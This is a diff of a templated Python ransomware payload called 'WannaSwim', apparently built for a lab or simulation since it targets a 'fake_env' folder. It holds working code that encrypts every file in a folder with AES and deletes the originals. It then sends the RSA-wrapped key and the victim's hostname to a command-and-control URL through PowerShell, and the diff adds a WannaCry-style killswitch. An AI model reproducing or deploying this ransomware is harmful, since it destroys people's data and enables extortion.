@@ -1,12 +1,3 @@
-{#---
-name: WannaSwim
-malware_type: ransomware
-lang: python
-description: WannaSwim is a ransomware payload written in Python.
----#}
-
-{% set start = "encrypt_fake_env_files" %}
-
 # --- IMPORTS ---
 import os
 import requests
@@ -26,26 +17,36 @@ from Crypto.Util.Padding import pad
 from Crypto.PublicKey import RSA
 import base64
 
-# --- CONFIGURATION ---
-C2_URL_KRAKEN = "{{ c2_url_kraken | default('http://127.0.0.1:8000') }}"
-FOLDER_PATH = r"{{ folder_path | default('C:/Users/XXX/Documents/fake_env_Documents') }}"
-RSA_KEY = "{{ rsa_key_b64 }}"
-EXTENSION = "{{ file_extension | default('kraken') }}"
+activate_killswitch = {{  activate_killswitch  }}
 
+def killswitch():
+    if activate_killswitch:
+        url = ''.join(random.choices(string.ascii_letters + string.digits, k=40)) + ".com"
+        try:
+            request_random = requests.get(url)
+            if request_random.status_code == 200:
+                return True
+        except requests.exceptions.RequestException:
+            pass
+        try:
+            request_google = requests.get("https://www.google.com")
+            if request_google.status_code == 200:
+                return False
+            else:
+                return True
+        except requests.exceptions.RequestException:
+            return True
+    else : 
+        return False
 
-# --- LOGIQUE ---
-# --- bloc_resolve_path ---
 def resolve_path(path_str):
   expanded = os.path.expandvars(path_str)  # Remplace %USERPROFILE%, etc.
   expanded = os.path.expanduser(expanded)  # Remplace ~
   return Path(expanded)
 
-# --- bloc_generate_aes_key ---
 def generate_aes_key():
   return get_random_bytes(32)
 
-
-# --- bloc_list_files_in_fake_env ---
 def list_files_in_fake_env(fake_root):
   if not fake_root.exists():
       return None
@@ -56,8 +57,6 @@ def list_files_in_fake_env(fake_root):
           files.append(file_path)
   return files
 
-
-# --- bloc_encrypt_file ---
 def encrypt_file(file_path, key):
   with open(file_path, 'rb') as f:
       file_data = f.read()
@@ -69,8 +68,6 @@ def encrypt_file(file_path, key):
       f.write(ct_bytes)
   os.remove(file_path)
 
-
-# --- bloc_encrypt_fake_env_files ---
 def encrypt_fake_env_files():
   fake_root = resolve_path("{{ folder_path }}")
   if not fake_root.exists():
@@ -83,23 +80,20 @@ def encrypt_fake_env_files():
   for file_path in files_to_encrypt:
       encrypt_file(file_path, aes_key)
 
-
-# --- bloc_send_aes_key_to_c2 ---
 def send_aes_key_to_c2(key):
   public_key = load_rsa_public_key()
   encrypted_aes_key = encrypt_aes_key_with_rsa(key, public_key)
-  c2_url_kraken = "{{ c2_url_kraken }}"
   hostname = socket.gethostname()
   timestamp = datetime.datetime.now().isoformat()
   payload = {
-      "malware_id": "4635749326579220869218518754801909255745",
+      "malware_id": "{{  malware_key  }}",
       "aes_key": encrypted_aes_key.hex(),
       "hostname": hostname,
       "timestamp": timestamp
   }
   json_payload = json.dumps(payload)
   powershell_command = f'''
-Invoke-RestMethod -Uri "{c2_url_kraken}" -Method Post -Body '{json_payload}' -ContentType "application/json"
+Invoke-RestMethod -Uri "{{ c2_url_kraken }}" -Method Post -Body '{json_payload}' -ContentType "application/json"
 '''
   try:
       subprocess.run(
@@ -111,17 +105,16 @@ Invoke-RestMethod -Uri "{c2_url_kraken}" -Method Post -Body '{json_payload}' -Co
   except Exception:
       pass
 
-
-# --- bloc_load_rsa_public_key ---
 def load_rsa_public_key():
-  b64_key = "{{ rsa_key_b64 }}"
+  b64_key = "{{ rsa_public_key_b64 }}"
   der_key = base64.b64decode(b64_key)
   return RSA.import_key(der_key)
 
-
-# --- bloc_encrypt_aes_key_with_rsa ---
 def encrypt_aes_key_with_rsa(aes_key, public_key):
     cipher_rsa = PKCS1_OAEP.new(public_key)
     return cipher_rsa.encrypt(aes_key)
 
-
+if killswitch():
+    sys.exit()
+else:
+    encrypt_fake_env_files()
